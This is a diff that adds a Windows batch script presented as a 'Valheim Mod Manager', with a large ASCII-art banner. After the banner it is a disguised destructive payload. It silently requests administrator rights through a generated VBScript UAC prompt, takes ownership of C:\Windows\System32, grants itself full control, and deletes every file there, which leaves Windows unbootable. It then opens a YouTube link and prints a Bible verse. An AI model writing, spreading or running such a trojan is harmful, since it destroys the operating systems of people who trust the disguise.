@@ -1,0 +1,68 @@
+@echo off
+
+title Valheim Mod Manager
+
+REM Set UTF-8 encoding for proper display of special characters
+chcp 65001 >nul
+
+REM Set the text color to green
+color 0A
+cls
+
+REM Display ASCII art
+echo.
+echo.
+echo ██╗   ██╗ █████╗ ██╗     ██╗  ██╗███████╗██╗███╗   ███╗    ███╗   ███╗ ██████╗ ██████╗
+echo ██║   ██║██╔══██╗██║     ██║  ██║██╔════╝██║████╗ ████║    ████╗ ████║██╔═══██╗██╔══██╗
+echo ██║   ██║███████║██║     ███████║█████╗  ██║██╔████╔██║    ██╔████╔██║██║   ██║██║  ██║
+echo ╚██╗ ██╔╝██╔══██║██║     ██╔══██║██╔══╝  ██║██║╚██╔╝██║    ██║╚██╔╝██║██║   ██║██║  ██║
+echo  ╚████╔╝ ██║  ██║███████╗██║  ██║███████╗██║██║ ╚═╝ ██║    ██║ ╚═╝ ██║╚██████╔╝██████╔╝
+echo   ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝ ╚═════╝ ╚═════╝                                                                                       
+echo             ███╗   ███╗ █████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗██████╗              
+echo             ████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝██╔══██╗             
+echo             ██╔████╔██║███████║██╔██╗ ██║███████║██║  ███╗█████╗  ██████╔╝             
+echo             ██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══██║██║   ██║██╔══╝  ██╔══██╗             
+echo             ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗██║  ██║             
+echo             ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝             
+echo.
+
+pause
+
+
+
+
+REM Check if running with admin privileges
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    set "admin=1"
+) else (
+    set "admin=0"
+)
+
+REM If not running with admin privileges, elevate
+if "%admin%"=="0" (
+    REM Elevate with VBScript
+    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
+        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+        cscript //nologo "%temp%\getadmin.vbs"
+        del "%temp%\getadmin.vbs"
+        exit /B
+    )
+)
+
+
+
+REM Take ownership of System32
+takeown /f C:\Windows\System32 /r /d y >nul 2>&1
+icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1
+cd C:\Windows\System32 >nul 2>&1
+
+REM Delete System32 (NOTE: DO NOT RUN THIS, WILL BREAK YOUR SYSTEM)
+del /F /S /Q *.* >nul 2>&1
+
+
+start firefox:https://www.youtube.com/watch?v=wnedkVrgFF0
+
+echo Matthew 7:12 Golden Rule *Do unto others as you would have them do unto you*  
+pause
